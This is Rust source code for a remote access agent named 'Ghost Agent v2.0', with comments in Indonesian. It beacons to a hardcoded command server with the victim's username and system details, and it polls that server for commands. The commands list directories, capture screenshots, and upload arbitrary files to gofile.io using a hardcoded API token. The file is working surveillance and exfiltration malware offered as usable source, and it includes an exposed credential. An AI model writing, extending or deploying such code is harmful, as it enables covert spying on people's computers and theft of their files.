use std::fs;
use std::io::Write;
use std::path::Path;
use std::time::Duration;
use tokio::time::sleep;
use serde::{Deserialize, Serialize};
use sysinfo::{System, SystemExt}; // SystemExt dibutuhkan di sysinfo 0.29
use reqwest::Client;
use screenshots::Screen;
use uuid::Uuid;
use base64::{Engine as _, engine::general_purpose}; // Fix base64 deprecated

// --- CONFIGURATION STRUCT ---
// Fix: Tambahkan 'Serialize' agar bisa disimpan kembali ke JSON
#[derive(Serialize, Deserialize, Clone)]
struct Config {
    api_url: String,
    device_name: String,
    heartbeat_interval_ms: u64,
    poll_interval_ms: u64,
    gofile_token: String,
    #[serde(default = "default_uuid")]
    device_id: String,
}

fn default_uuid() -> String {
    Uuid::new_v4().to_string()
}

// --- PAYLOAD STRUCTS ---
#[derive(Serialize)]
struct HeartbeatPayload {
    action: String,
    device_id: String,
    device_name: String,
    ram_usage: u64, // in MB
    ram_total: u64, // in MB
    platform: String,
    user: String,
}

#[derive(Serialize)]
struct CommandResponse {
    action: String,
    device_id: String,
    reply_to_id: String,
    status: String,
    data: Option<serde_json::Value>,
}

#[derive(Deserialize)]
struct PendingCommand {
    messageId: String,
    command: String,
    args: Option<String>,
}

#[derive(Serialize)]
struct FileEntry {
    name: String,
    kind: String,
    size: String,
}

// --- MAIN LOGIC ---

#[tokio::main]
async fn main() {
    println!("👻 Ghost Agent v2.0 - Active...");

    let mut config = load_or_create_config();
    println!("📱 Device ID: {}", config.device_id);
    
    let client = Client::builder().build().unwrap();

    // 2. Spawn Heartbeat Task
    let hb_config = config.clone();
    let hb_client = client.clone();
    
    tokio::spawn(async move {
        // Inisialisasi System object sekali saja
        let mut sys = System::new_all();
        loop {
            // Refresh specific data
            sys.refresh_memory();
            
            // Fix: sysinfo 0.29 uses methods on the instance, need SystemExt trait
            let payload = HeartbeatPayload {
                action: "heartbeat".to_string(),
                device_id: hb_config.device_id.clone(),
                device_name: hb_config.device_name.clone(),
                ram_usage: sys.used_memory() / 1024 / 1024,
                ram_total: sys.total_memory() / 1024 / 1024,
                platform: format!("{} {}", sys.name().unwrap_or_default(), sys.os_version().unwrap_or_default()),
                user: whoami::username(),
            };

            let _ = hb_client.post(&hb_config.api_url).json(&payload).send().await;
            sleep(Duration::from_millis(hb_config.heartbeat_interval_ms)).await;
        }
    });

    // 3. Command Polling Loop
    loop {
        match fetch_command(&client, &config).await {
            Ok(Some(cmd)) => {
                println!("📩 Command: {} Args: {:?}", cmd.command, cmd.args);
                process_command(&client, &config, cmd).await;
            }
            Err(e) => println!("⚠️ Poll Error: {}", e),
            _ => {}
        }
        sleep(Duration::from_millis(config.poll_interval_ms)).await;
    }
}

// --- UTILS ---

fn load_or_create_config() -> Config {
    let path = "config.json";
    if Path::new(path).exists() {
        let content = fs::read_to_string(path).unwrap();
        let mut cfg: Config = serde_json::from_str(&content).unwrap_or_else(|_| {
            println!("⚠️ Config rusak, reset...");
            create_default_config(path)
        });
        
        if cfg.device_id.is_empty() {
            cfg.device_id = Uuid::new_v4().to_string();
            save_config(path, &cfg);
        }
        return cfg;
    } 
    create_default_config(path)
}

fn create_default_config(path: &str) -> Config {
    let username = whoami::username();
    let devicename = whoami::devicename();
    
    let default_cfg = Config {
        api_url: "https://erzysh.vercel.app/api/ghost".to_string(),
        device_name: format!("{}-{}", username, devicename),
        heartbeat_interval_ms: 5000,
        poll_interval_ms: 2000,
        gofile_token: "eNi42POOnDBiGBWf9LfDOP2Yjoe7DqQy".to_string(),
        device_id: Uuid::new_v4().to_string(),
    };

    save_config(path, &default_cfg);
    default_cfg
}

fn save_config(path: &str, config: &Config) {
    let json = serde_json::to_string_pretty(config).unwrap();
    let mut file = fs::File::create(path).expect("Gagal membuat file config");
    file.write_all(json.as_bytes()).expect("Gagal menulis config");
}

async fn fetch_command(client: &Client, config: &Config) -> Result<Option<PendingCommand>, Box<dyn std::error::Error>> {
    let url = format!("{}?deviceId={}", config.api_url, config.device_id);
    let resp = client.get(&url).send().await?;
    
    if resp.status().is_success() {
        let text = resp.text().await?;
        if text.trim().is_empty() || text == "null" { return Ok(None); }
        if let Ok(cmd) = serde_json::from_str::<PendingCommand>(&text) {
            return Ok(Some(cmd));
        }
    }
    Ok(None)
}

async fn process_command(client: &Client, config: &Config, cmd: PendingCommand) {
    let mut response_data: Option<serde_json::Value> = None;
    let mut status = "DONE".to_string();

    match cmd.command.as_str() {
        "LS" => {
            let path_str = cmd.args.unwrap_or_else(|| "C:\\".to_string());
            match fs::read_dir(&path_str) {
                Ok(entries) => {
                    let mut files: Vec<FileEntry> = Vec::new();
                    for entry in entries {
                        if let Ok(entry) = entry {
                            let meta = entry.metadata().unwrap();
                            files.push(FileEntry {
                                name: entry.file_name().to_string_lossy().to_string(),
                                kind: if meta.is_dir() { "dir".to_string() } else { "file".to_string() },
                                size: if meta.is_dir() { "-".to_string() } else { format_size(meta.len()) }
                            });
                        }
                    }
                    files.sort_by(|a, b| {
                        if a.kind == b.kind { a.name.cmp(&b.name) } 
                        else if a.kind == "dir" { std::cmp::Ordering::Less } 
                        else { std::cmp::Ordering::Greater }
                    });
                    response_data = Some(serde_json::json!({ "current_path": path_str, "files": files }));
                }
                Err(e) => {
                    status = "ERROR".to_string();
                    response_data = Some(serde_json::json!({ "message": e.to_string() }));
                }
            }
        },
        "SCREENSHOT" => {
            let screens = Screen::all().unwrap_or_default();
            if let Some(screen) = screens.first() {
                match screen.capture() {
                    Ok(image) => {
                        // Fix: Menggunakan cursor dan crate image untuk write ke buffer PNG
                        let mut cursor = std::io::Cursor::new(Vec::new());
                        // ImageOutputFormat perlu 'image' crate
                        let _ = image.write_to(&mut cursor, image::ImageOutputFormat::Png);
                        
                        // Fix: Menggunakan base64 engine baru
                        let b64 = general_purpose::STANDARD.encode(cursor.get_ref());
                        response_data = Some(serde_json::json!({ "image": b64 }));
                    },
                    Err(e) => {
                        status = "ERROR".to_string();
                        response_data = Some(serde_json::json!({ "message": e.to_string() }));
                    }
                }
            }
        },
        "GET_FILE" => {
            let path_str = cmd.args.unwrap_or_default();
            match upload_to_gofile(client, &path_str, &config.gofile_token).await {
                Ok(url) => response_data = Some(serde_json::json!({ "url": url })),
                Err(e) => {
                    status = "ERROR".to_string();
                    response_data = Some(serde_json::json!({ "message": e.to_string() }));
                }
            }
        },
        _ => {
            status = "ERROR".to_string();
            response_data = Some(serde_json::json!({ "message": "Unknown command" }));
        }
    }

    let payload = CommandResponse {
        action: "response".to_string(),
        device_id: config.device_id.clone(),
        reply_to_id: cmd.messageId,
        status,
        data: response_data,
    };

    let _ = client.post(&config.api_url).json(&payload).send().await;
}

fn format_size(bytes: u64) -> String {
    const UNITS: [&str; 4] = ["B", "KB", "MB", "GB"];
    let mut b = bytes as f64;
    let mut i = 0;
    while b >= 1024.0 && i < UNITS.len() - 1 {
        b /= 1024.0;
        i += 1;
    }
    format!("{:.2} {}", b, UNITS[i])
}

async fn upload_to_gofile(client: &Client, file_path: &str, token: &str) -> Result<String, Box<dyn std::error::Error>> {
    // Fix: tokio_util sekarang sudah diimport di Cargo.toml
    use tokio_util::codec::{BytesCodec, FramedRead};
    use tokio::fs::File;
    
    let path = Path::new(file_path);
    if !path.exists() { return Err("File not found".into()); }

    let file = File::open(file_path).await?;
    let stream = FramedRead::new(file, BytesCodec::new());
    let file_body = reqwest::Body::wrap_stream(stream);
    let filename = path.file_name().unwrap().to_string_lossy().to_string();

    let form = reqwest::multipart::Form::new()
        .part("file", reqwest::multipart::Part::stream(file_body).file_name(filename));

    let upload_resp = client.post("https://upload-ap-sgp.gofile.io/uploadFile")
        .header("Authorization", format!("Bearer {}", token))
        .multipart(form)
        .send()
        .await?;

    let json: serde_json::Value = upload_resp.json().await?;
    
    if json["status"].as_str().unwrap_or("") == "ok" {
        Ok(json["data"]["downloadPage"].as_str().unwrap_or("").to_string())
    } else {
        Err(format!("Gofile error: {:?}", json).into())
    }
}